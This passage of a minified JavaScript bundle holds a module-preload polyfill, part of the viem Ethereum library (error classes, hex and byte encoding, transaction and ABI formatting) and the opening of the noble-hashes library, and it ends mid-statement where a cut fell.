(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const o of document.querySelectorAll('link[rel="modulepreload"]'))r(o);new MutationObserver(o=>{for(const i of o)if(i.type==="childList")for(const a of i.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&r(a)}).observe(document,{childList:!0,subtree:!0});function n(o){const i={};return o.integrity&&(i.integrity=o.integrity),o.referrerPolicy&&(i.referrerPolicy=o.referrerPolicy),o.crossOrigin==="use-credentials"?i.credentials="include":o.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function r(o){if(o.ep)return;o.ep=!0;const i=n(o);fetch(o.href,i)}})();function Ku(t,e={}){const{fees:n=t.fees,formatters:r=t.formatters,serializers:o=t.serializers}=e;return{...t,fees:n,formatters:r,serializers:o}}const fm="1.21.3",hm=t=>t,fc=t=>t,pm=()=>`viem@${fm}`;class G extends Error{constructor(e,n={}){var i;super(),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ViemError"}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:pm()});const r=n.cause instanceof G?n.cause.details:(i=n.cause)!=null&&i.message?n.cause.message:n.details,o=n.cause instanceof G&&n.cause.docsPath||n.docsPath;this.message=[e||"An error occurred.","",...n.metaMessages?[...n.metaMessages,""]:[],...o?[`Docs: https://viem.sh${o}.html${n.docsSlug?`#${n.docsSlug}`:""}`]:[],...r?[`Details: ${r}`]:[],`Version: ${this.version}`].join(`
`),n.cause&&(this.cause=n.cause),this.details=r,this.docsPath=o,this.metaMessages=n.metaMessages,this.shortMessage=e}walk(e){return lh(this,e)}}function lh(t,e){return e!=null&&e(t)?t:t&&typeof t=="object"&&"cause"in t?lh(t.cause,e):e?null:t}class mm extends G{constructor({max:e,min:n,signed:r,size:o,value:i}){super(`Number "${i}" is not in safe ${o?`${o*8}-bit ${r?"signed":"unsigned"} `:""}integer range ${e?`(${n} to ${e})`:`(above ${n})`}`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"IntegerOutOfRangeError"})}}class gm extends G{constructor(e){super(`Hex value "${e}" is not a valid boolean. The hex value must be "0x0" (false) or "0x1" (true).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidHexBooleanError"})}}class wm extends G{constructor({givenSize:e,maxSize:n}){super(`Size cannot exceed ${n} bytes. Given size: ${e} bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SizeOverflowError"})}}function _n(t,{strict:e=!0}={}){return!t||typeof t!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(t):t.startsWith("0x")}function lt(t){return _n(t,{strict:!1})?Math.ceil((t.length-2)/2):t.length}function jr(t,{dir:e="left"}={}){let n=typeof t=="string"?t.replace("0x",""):t,r=0;for(let o=0;o<n.length-1&&n[e==="left"?o:n.length-o-1].toString()==="0";o++)r++;return n=e==="left"?n.slice(r):n.slice(0,n.length-r),typeof t=="string"?(n.length===1&&e==="right"&&(n=`${n}0`),`0x${n.length%2===1?`0${n}`:n}`):n}class uh extends G{constructor({offset:e,position:n,size:r}){super(`Slice ${n==="start"?"starting":"ending"} at offset "${e}" is out-of-bounds (size: ${r}).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SliceOffsetOutOfBoundsError"})}}class dh extends G{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (${e}) exceeds padding size (${n}).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SizeExceedsPaddingSizeError"})}}function ro(t,{dir:e,size:n=32}={}){return typeof t=="string"?or(t,{dir:e,size:n}):bm(t,{dir:e,size:n})}function or(t,{dir:e,size:n=32}={}){if(n===null)return t;const r=t.replace("0x","");if(r.length>n*2)throw new dh({size:Math.ceil(r.length/2),targetSize:n,type:"hex"});return`0x${r[e==="right"?"padEnd":"padStart"](n*2,"0")}`}function bm(t,{dir:e,size:n=32}={}){if(n===null)return t;if(t.length>n)throw new dh({size:t.length,targetSize:n,type:"bytes"});const r=new Uint8Array(n);for(let o=0;o<n;o++){const i=e==="right";r[i?o:n-o-1]=t[i?o:t.length-o-1]}return r}const ym=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Zn(t,e={}){return typeof t=="number"||typeof t=="bigint"?xe(t,e):typeof t=="string"?Yu(t,e):typeof t=="boolean"?fh(t,e):No(t,e)}function fh(t,e={}){const n=`0x${Number(t)}`;return typeof e.size=="number"?(vr(n,{size:e.size}),ro(n,{size:e.size})):n}function No(t,e={}){let n="";for(let o=0;o<t.length;o++)n+=ym[t[o]];const r=`0x${n}`;return typeof e.size=="number"?(vr(r,{size:e.size}),ro(r,{dir:"right",size:e.size})):r}function xe(t,e={}){const{signed:n,size:r}=e,o=BigInt(t);let i;r?n?i=(1n<<BigInt(r)*8n-1n)-1n:i=2n**(BigInt(r)*8n)-1n:typeof t=="number"&&(i=BigInt(Number.MAX_SAFE_INTEGER));const a=typeof i=="bigint"&&n?-i-1n:0;if(i&&o>i||o<a){const c=typeof t=="bigint"?"n":"";throw new mm({max:i?`${i}${c}`:void 0,min:`${a}${c}`,signed:n,size:r,value:`${t}${c}`})}const s=`0x${(n&&o<0?(1n<<BigInt(r*8))+BigInt(o):o).toString(16)}`;return r?ro(s,{size:r}):s}const vm=new TextEncoder;function Yu(t,e={}){const n=vm.encode(t);return No(n,e)}const xm=new TextEncoder;function lr(t,e={}){return typeof t=="number"||typeof t=="bigint"?Em(t,e):typeof t=="boolean"?_m(t,e):_n(t)?Ju(t,e):Ln(t,e)}function _m(t,e={}){const n=new Uint8Array(1);return n[0]=Number(t),typeof e.size=="number"?(vr(n,{size:e.size}),ro(n,{size:e.size})):n}const Nn={zero:48,nine:57,A:65,F:70,a:97,f:102};function bf(t){if(t>=Nn.zero&&t<=Nn.nine)return t-Nn.zero;if(t>=Nn.A&&t<=Nn.F)return t-(Nn.A-10);if(t>=Nn.a&&t<=Nn.f)return t-(Nn.a-10)}function Ju(t,e={}){let n=t;e.size&&(vr(n,{size:e.size}),n=ro(n,{dir:"right",size:e.size}));let r=n.slice(2);r.length%2&&(r=`0${r}`);const o=r.length/2,i=new Uint8Array(o);for(let a=0,s=0;a<o;a++){const c=bf(r.charCodeAt(s++)),l=bf(r.charCodeAt(s++));if(c===void 0||l===void 0)throw new G(`Invalid byte sequence ("${r[s-2]}${r[s-1]}" in "${r}").`);i[a]=c*16+l}return i}function Em(t,e){const n=xe(t,e);return Ju(n)}function Ln(t,e={}){const n=xm.encode(t);return typeof e.size=="number"?(vr(n,{size:e.size}),ro(n,{dir:"right",size:e.size})):n}function vr(t,{size:e}){if(lt(t)>e)throw new wm({givenSize:lt(t),maxSize:e})}function hc(t,e={}){const{signed:n}=e;e.size&&vr(t,{size:e.size});const r=BigInt(t);if(!n)return r;const o=(t.length-2)/2,i=(1n<<BigInt(o)*8n-1n)-1n;return r<=i?r:r-BigInt(`0x${"f".padStart(o*2,"f")}`)-1n}function Cm(t,e={}){let n=t;if(e.size&&(vr(n,{size:e.size}),n=jr(n)),jr(n)==="0x00")return!1;if(jr(n)==="0x01")return!0;throw new gm(n)}function wt(t,e={}){return Number(hc(t,e))}function hh(t,e={}){let n=Ju(t);return e.size&&(vr(n,{size:e.size}),n=jr(n,{dir:"right"})),new TextDecoder().decode(n)}const ph={"0x0":"legacy","0x1":"eip2930","0x2":"eip1559"};function mh(t){const e={...t,blockHash:t.blockHash?t.blockHash:null,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,chainId:t.chainId?wt(t.chainId):void 0,gas:t.gas?BigInt(t.gas):void 0,gasPrice:t.gasPrice?BigInt(t.gasPrice):void 0,maxFeePerGas:t.maxFeePerGas?BigInt(t.maxFeePerGas):void 0,maxPriorityFeePerGas:t.maxPriorityFeePerGas?BigInt(t.maxPriorityFeePerGas):void 0,nonce:t.nonce?wt(t.nonce):void 0,to:t.to?t.to:null,transactionIndex:t.transactionIndex?Number(t.transactionIndex):null,type:t.type?ph[t.type]:void 0,typeHex:t.type?t.type:void 0,value:t.value?BigInt(t.value):void 0,v:t.v?BigInt(t.v):void 0};return e.yParity=(()=>{if(t.yParity)return Number(t.yParity);if(typeof e.v=="bigint"){if(e.v===0n||e.v===27n)return 0;if(e.v===1n||e.v===28n)return 1;if(e.v>=35n)return e.v%2n===0n?1:0}})(),e.type==="legacy"&&(delete e.accessList,delete e.maxFeePerGas,delete e.maxPriorityFeePerGas,delete e.yParity),e.type==="eip2930"&&(delete e.maxFeePerGas,delete e.maxPriorityFeePerGas),e}function gh(t){var n;const e=(n=t.transactions)==null?void 0:n.map(r=>typeof r=="string"?r:mh(r));return{...t,baseFeePerGas:t.baseFeePerGas?BigInt(t.baseFeePerGas):null,difficulty:t.difficulty?BigInt(t.difficulty):void 0,gasLimit:t.gasLimit?BigInt(t.gasLimit):void 0,gasUsed:t.gasUsed?BigInt(t.gasUsed):void 0,hash:t.hash?t.hash:null,logsBloom:t.logsBloom?t.logsBloom:null,nonce:t.nonce?t.nonce:null,number:t.number?BigInt(t.number):null,size:t.size?BigInt(t.size):void 0,timestamp:t.timestamp?BigInt(t.timestamp):void 0,transactions:e,totalDifficulty:t.totalDifficulty?BigInt(t.totalDifficulty):null}}function on(t,{args:e,eventName:n}={}){return{...t,blockHash:t.blockHash?t.blockHash:null,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,logIndex:t.logIndex?Number(t.logIndex):null,transactionHash:t.transactionHash?t.transactionHash:null,transactionIndex:t.transactionIndex?Number(t.transactionIndex):null,...n?{args:e,eventName:n}:{}}}const Sm={"0x0":"reverted","0x1":"success"};function Am(t){return{...t,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,contractAddress:t.contractAddress?t.contractAddress:null,cumulativeGasUsed:t.cumulativeGasUsed?BigInt(t.cumulativeGasUsed):null,effectiveGasPrice:t.effectiveGasPrice?BigInt(t.effectiveGasPrice):null,gasUsed:t.gasUsed?BigInt(t.gasUsed):null,logs:t.logs?t.logs.map(e=>on(e)):null,to:t.to?t.to:null,transactionIndex:t.transactionIndex?wt(t.transactionIndex):null,status:t.status?Sm[t.status]:null,type:t.type?ph[t.type]||t.type:null}}const Tm={legacy:"0x0",eip2930:"0x1",eip1559:"0x2"};function pc(t){return{...t,gas:typeof t.gas<"u"?xe(t.gas):void 0,gasPrice:typeof t.gasPrice<"u"?xe(t.gasPrice):void 0,maxFeePerGas:typeof t.maxFeePerGas<"u"?xe(t.maxFeePerGas):void 0,maxPriorityFeePerGas:typeof t.maxPriorityFeePerGas<"u"?xe(t.maxPriorityFeePerGas):void 0,nonce:typeof t.nonce<"u"?xe(t.nonce):void 0,type:typeof t.type<"u"?Tm[t.type]:void 0,value:typeof t.value<"u"?xe(t.value):void 0}}class ko extends G{constructor({address:e}){super(`Address "${e}" is invalid.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAddressError"})}}class Vl extends G{constructor({blockNumber:e,chain:n,contract:r}){super(`Chain "${n.name}" does not support contract "${r.name}".`,{metaMessages:["This could be due to any of the following:",...e&&r.blockCreated&&r.blockCreated>e?[`- The contract "${r.name}" was not deployed until block ${r.blockCreated} (current block ${e}).`]:[`- The chain does not have the contract "${r.name}" configured.`]]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ChainDoesNotSupportContract"})}}let Im=class extends G{constructor({chain:e,currentChainId:n}){super(`The current chain of the wallet (id: ${n}) does not match the target chain for the transaction (id: ${e.id} – ${e.name}).`,{metaMessages:[`Current Chain ID:  ${n}`,`Expected Chain ID: ${e.id} – ${e.name}`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ChainMismatchError"})}};class $m extends G{constructor(){super(["No chain was provided to the request.","Please provide a chain with the `chain` argument on the Action, or by supplying a `chain` to WalletClient."].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ChainNotFoundError"})}}class wh extends G{constructor(){super("No chain was provided to the Client."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ClientChainNotConfiguredError"})}}const Om={gwei:9,wei:18},Pm={ether:-9,wei:9},Dm={ether:-18,gwei:-9};function _s(t,e){let n=t.toString();const r=n.startsWith("-");r&&(n=n.slice(1)),n=n.padStart(e,"0");let[o,i]=[n.slice(0,n.length-e),n.slice(n.length-e)];return i=i.replace(/(0+)$/,""),`${r?"-":""}${o||"0"}${i?`.${i}`:""}`}function Ot(t,e="wei"){return _s(t,Pm[e])}class Ti extends G{constructor({cause:e,message:n}={}){var o;const r=(o=n==null?void 0:n.replace("execution reverted: ",""))==null?void 0:o.replace("execution reverted","");super(`Execution reverted ${r?`with reason: ${r}`:"for an unknown reason"}.`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ExecutionRevertedError"})}}Object.defineProperty(Ti,"code",{enumerable:!0,configurable:!0,writable:!0,value:3});Object.defineProperty(Ti,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/execution reverted/});class Es extends G{constructor({cause:e,maxFeePerGas:n}={}){super(`The fee cap (\`maxFeePerGas\`${n?` = ${Ot(n)} gwei`:""}) cannot be higher than the maximum allowed value (2^256-1).`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"FeeCapTooHigh"})}}Object.defineProperty(Es,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas higher than 2\^256-1|fee cap higher than 2\^256-1/});class Zl extends G{constructor({cause:e,maxFeePerGas:n}={}){super(`The fee cap (\`maxFeePerGas\`${n?` = ${Ot(n)}`:""} gwei) cannot be lower than the block base fee.`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"FeeCapTooLow"})}}Object.defineProperty(Zl,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas less than block base fee|fee cap less than block base fee|transaction is outdated/});class Gl extends G{constructor({cause:e,nonce:n}={}){super(`Nonce provided for the transaction ${n?`(${n}) `:""}is higher than the next one expected.`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"NonceTooHighError"})}}Object.defineProperty(Gl,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too high/});class ql extends G{constructor({cause:e,nonce:n}={}){super([`Nonce provided for the transaction ${n?`(${n}) `:""}is lower than the current nonce of the account.`,"Try increasing the nonce or find the latest nonce with `getTransactionCount`."].join(`
`),{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"NonceTooLowError"})}}Object.defineProperty(ql,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too low|transaction already imported|already known/});class Kl extends G{constructor({cause:e,nonce:n}={}){super(`Nonce provided for the transaction ${n?`(${n}) `:""}exceeds the maximum allowed nonce.`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"NonceMaxValueError"})}}Object.defineProperty(Kl,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce has max value/});class Yl extends G{constructor({cause:e}={}){super(["The total cost (gas * gas fee + value) of executing this transaction exceeds the balance of the account."].join(`
`),{cause:e,metaMessages:["This error could arise when the account does not have enough funds to:"," - pay for the total gas fee,"," - pay for the value to send."," ","The cost of the transaction is calculated as `gas * gas fee + value`, where:"," - `gas` is the amount of gas needed for transaction to execute,"," - `gas fee` is the gas fee,"," - `value` is the amount of ether to send to the recipient."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InsufficientFundsError"})}}Object.defineProperty(Yl,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/insufficient funds/});class Jl extends G{constructor({cause:e,gas:n}={}){super(`The amount of gas ${n?`(${n}) `:""}provided for the transaction exceeds the limit allowed for the block.`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"IntrinsicGasTooHighError"})}}Object.defineProperty(Jl,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too high|gas limit reached/});class Xl extends G{constructor({cause:e,gas:n}={}){super(`The amount of gas ${n?`(${n}) `:""}provided for the transaction is too low.`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"IntrinsicGasTooLowError"})}}Object.defineProperty(Xl,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too low/});class Ql extends G{constructor({cause:e}){super("The transaction type is not supported for this chain.",{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"TransactionTypeNotSupportedError"})}}Object.defineProperty(Ql,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/transaction type not valid/});class Cs extends G{constructor({cause:e,maxPriorityFeePerGas:n,maxFeePerGas:r}={}){super([`The provided tip (\`maxPriorityFeePerGas\`${n?` = ${Ot(n)} gwei`:""}) cannot be higher than the fee cap (\`maxFeePerGas\`${r?` = ${Ot(r)} gwei`:""}).`].join(`
`),{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"TipAboveFeeCapError"})}}Object.defineProperty(Cs,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max priority fee per gas higher than max fee per gas|tip higher than fee cap/});class mc extends G{constructor({cause:e}){super(`An error occurred while executing: ${e==null?void 0:e.shortMessage}`,{cause:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownNodeError"})}}const Rm=/^0x[a-fA-F0-9]{40}$/;function ur(t){return Rm.test(t)}function Fn(t){return typeof t[0]=="string"?Xu(t):Nm(t)}function Nm(t){let e=0;for(const o of t)e+=o.length;const n=new Uint8Array(e);let r=0;for(const o of t)n.set(o,r),r+=o.length;return n}function Xu(t){return`0x${t.reduce((e,n)=>e+n.replace("0x",""),"")}`}function km(t,e){const n=t.exec(e);return n==null?void 0:n.groups}const yf=/^tuple(?<array>(\[(\d*)\])*)$/;function eu(t){let e=t.type;if(yf.test(t.type)&&"components"in t){e="(";const n=t.components.length;for(let o=0;o<n;o++){const i=t.components[o];e+=eu(i),o<n-1&&(e+=", ")}const r=km(yf,t.type);return e+=`)${(r==null?void 0:r.array)??""}`,eu({...t,type:e})}return"indexed"in t&&t.indexed&&(e=`${e} indexed`),t.name?`${e} ${t.name}`:e}function go(t){let e="";const n=t.length;for(let r=0;r<n;r++){const o=t[r];e+=eu(o),r!==n-1&&(e+=", ")}return e}function Mm(t){return t.type==="function"?`function ${t.name}(${go(t.inputs)})${t.stateMutability&&t.stateMutability!=="nonpayable"?` ${t.stateMutability}`:""}${t.outputs.length?` returns (${go(t.outputs)})`:""}`:t.type==="event"?`event ${t.name}(${go(t.inputs)})`:t.type==="error"?`error ${t.name}(${go(t.inputs)})`:t.type==="constructor"?`constructor(${go(t.inputs)})${t.stateMutability==="payable"?" payable":""}`:t.type==="fallback"?"fallback()":"receive() external payable"}function he(t,e,n){return r=>{var o;return((o=t[e.name||n])==null?void 0:o.call(t,r))??e(t,r)}}function Wn(t,{includeName:e=!1}={}){if(t.type!=="function"&&t.type!=="event"&&t.type!=="error")throw new Ym(t.type);return`${t.name}(${gc(t.inputs,{includeName:e})})`}function gc(t,{includeName:e=!1}={}){return t?t.map(n=>Um(n,{includeName:e})).join(e?", ":","):""}function Um(t,{includeName:e}){return t.type.startsWith("tuple")?`(${gc(t.components,{includeName:e})})${t.type.slice(5)}`:t.type+(e&&t.name?` ${t.name}`:"")}class Bm extends G{constructor({docsPath:e}){super(["A constructor was not found on the ABI.","Make sure you are using the correct ABI and that the constructor exists on it."].join(`
`),{docsPath:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiConstructorNotFoundError"})}}class vf extends G{constructor({docsPath:e}){super(["Constructor arguments were provided (`args`), but a constructor parameters (`inputs`) were not found on the ABI.","Make sure you are using the correct ABI, and that the `inputs` attribute on the constructor exists."].join(`
`),{docsPath:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiConstructorParamsNotFoundError"})}}class Qu extends G{constructor({data:e,params:n,size:r}){super([`Data size of ${r} bytes is too small for given parameters.`].join(`
`),{metaMessages:[`Params: (${gc(n,{includeName:!0})})`,`Data:   ${e} (${r} bytes)`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiDecodingDataSizeTooSmallError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"params",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"size",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=e,this.params=n,this.size=r}}class wc extends G{constructor(){super('Cannot decode zero data ("0x") with ABI parameters.'),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiDecodingZeroDataError"})}}class Lm extends G{constructor({expectedLength:e,givenLength:n,type:r}){super([`ABI encoding array length mismatch for type ${r}.`,`Expected length: ${e}`,`Given length: ${n}`].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiEncodingArrayLengthMismatchError"})}}class jm extends G{constructor({expectedSize:e,value:n}){super(`Size of bytes "${n}" (bytes${lt(n)}) does not match expected size (bytes${e}).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiEncodingBytesSizeMismatchError"})}}class Fm extends G{constructor({expectedLength:e,givenLength:n}){super(["ABI encoding params/values length mismatch.",`Expected length (params): ${e}`,`Given length (values): ${n}`].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiEncodingLengthMismatchError"})}}class bh extends G{constructor(e,{docsPath:n}){super([`Encoded error signature "${e}" not found on ABI.`,"Make sure you are using the correct ABI and that the error exists on it.",`You can look up the decoded signature here: https://openchain.xyz/signatures?query=${e}.`].join(`
`),{docsPath:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiErrorSignatureNotFoundError"}),Object.defineProperty(this,"signature",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.signature=e}}class Wm extends G{constructor({docsPath:e}){super("Cannot extract event signature from empty topics.",{docsPath:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiEventSignatureEmptyTopicsError"})}}class zm extends G{constructor(e,{docsPath:n}){super([`Encoded event signature "${e}" not found on ABI.`,"Make sure you are using the correct ABI and that the event exists on it.",`You can look up the signature here: https://openchain.xyz/signatures?query=${e}.`].join(`
`),{docsPath:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiEventSignatureNotFoundError"})}}class xf extends G{constructor(e,{docsPath:n}={}){super([`Event ${e?`"${e}" `:""}not found on ABI.`,"Make sure you are using the correct ABI and that the event exists on it."].join(`
`),{docsPath:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiEventNotFoundError"})}}class Ss extends G{constructor(e,{docsPath:n}={}){super([`Function ${e?`"${e}" `:""}not found on ABI.`,"Make sure you are using the correct ABI and that the function exists on it."].join(`
`),{docsPath:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiFunctionNotFoundError"})}}class Hm extends G{constructor(e,{docsPath:n}){super([`Function "${e}" does not contain any \`outputs\` on ABI.`,"Cannot decode function result without knowing what the parameter types are.","Make sure you are using the correct ABI and that the function exists on it."].join(`
`),{docsPath:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiFunctionOutputsNotFoundError"})}}class Vm extends G{constructor(e,n){super("Found ambiguous types in overloaded ABI items.",{metaMessages:[`\`${e.type}\` in \`${Wn(e.abiItem)}\`, and`,`\`${n.type}\` in \`${Wn(n.abiItem)}\``,"","These types encode differently and cannot be distinguished at runtime.","Remove one of the ambiguous items in the ABI."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiItemAmbiguityError"})}}class Zm extends G{constructor({expectedSize:e,givenSize:n}){super(`Expected bytes${e}, got bytes${n}.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BytesSizeMismatchError"})}}class Hr extends G{constructor({abiItem:e,data:n,params:r,size:o}){super([`Data size of ${o} bytes is too small for non-indexed event parameters.`].join(`
`),{metaMessages:[`Params: (${gc(r,{includeName:!0})})`,`Data:   ${n} (${o} bytes)`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"DecodeLogDataMismatch"}),Object.defineProperty(this,"abiItem",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"params",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"size",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abiItem=e,this.data=n,this.params=r,this.size=o}}class io extends G{constructor({abiItem:e,param:n}){super([`Expected a topic for indexed event parameter${n.name?` "${n.name}"`:""} on event "${Wn(e,{includeName:!0})}".`].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"DecodeLogTopicsMismatch"}),Object.defineProperty(this,"abiItem",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abiItem=e}}class Gm extends G{constructor(e,{docsPath:n}){super([`Type "${e}" is not a valid encoding type.`,"Please provide a valid ABI type."].join(`
`),{docsPath:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAbiEncodingType"})}}class qm extends G{constructor(e,{docsPath:n}){super([`Type "${e}" is not a valid decoding type.`,"Please provide a valid ABI type."].join(`
`),{docsPath:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAbiDecodingType"})}}class Km extends G{constructor(e){super([`Value "${e}" is not a valid array.`].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidArrayError"})}}class Ym extends G{constructor(e){super([`"${e}" is not a valid definition type.`,'Valid types: "function", "event", "error"'].join(`
`)),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidDefinitionTypeError"})}}class Jm extends G{constructor(e){super(`Filter type "${e}" is not supported.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"FilterTypeNotSupportedError"})}}function Xm(t){let e=!0,n="",r=0,o="",i=!1;for(let a=0;a<t.length;a++){const s=t[a];if(["(",")",","].includes(s)&&(e=!0),s==="("&&r++,s===")"&&r--,!!e){if(r===0){if(s===" "&&["event","function",""].includes(o))o="";else if(o+=s,s===")"){i=!0;break}continue}if(s===" "){t[a-1]!==","&&n!==","&&n!==",("&&(n="",e=!1);continue}o+=s,n+=s}}if(!i)throw new G("Unable to normalize signature.");return o}const yh=t=>{const e=typeof t=="string"?t:Mm(t);return Xm(e)},Qm=t=>yh(t);function _f(t){if(!Number.isSafeInteger(t)||t<0)throw new Error(`Wrong positive integer: ${t}`)}function vh(t,...e){if(!(t instanceof Uint8Array))throw new Error("Expected Uint8Array");if(e.length>0&&!e.includes(t.length))throw new Error(`Expected Uint8Array of length ${e}, not of length=${t.length}`)}function Ef(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function eg(t,e){vh(t);const n=e.outputLen;if(t.length<n)throw new Error(`digestInto() expects output buffer of length at least ${n}`)}const is=BigInt(2**32-1),Cf=BigInt(32);function tg(t,e=!1){return e?{h:Number(t&is),l:Number(t>>Cf&is)}:{h:Number(t>>Cf&is)|0,l:Number(t&is)|0}}function ng(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let o=0;o<t.length;o++){const{h:i,l:a}=tg(t[o],e);[n[o],r[o]]=[i,a]}return[n,r]}const rg=(t,e,n)=>t<<n|e>>>32-n,ig=(t,e,n)=>e<<n|t>>>32-n,og=(t,e,n)=>e<<n-32|t>>>64-n,ag=(t,e,n)=>t<<n-32|e>>>64-n;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */const sg=t=>t instanceof Uint8Array,cg=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),lg=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!lg)throw new Error("Non little-endian hardware is not supported");function ug(t){if(typeof t!="string")throw new Error(`utf8ToBytes expected string, got ${typeof t}`);return new Uint8Array(new TextEncoder().encode(t))}function xh(t){if(typeof t=="string"&&(t=ug(t)),!sg(t))throw new Error(`expected Uint8Array, got ${typeof t}`);return t}class dg{clone(){return this._cloneInto()}}function fg(t){const e=r=>t().update(xh(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}const[_h,Eh,Ch]=[[],[],[]],hg=BigInt(0),wo=BigInt(1),pg=BigInt(2),mg=BigInt(7),gg=BigInt(256),wg=BigInt(113);for(let 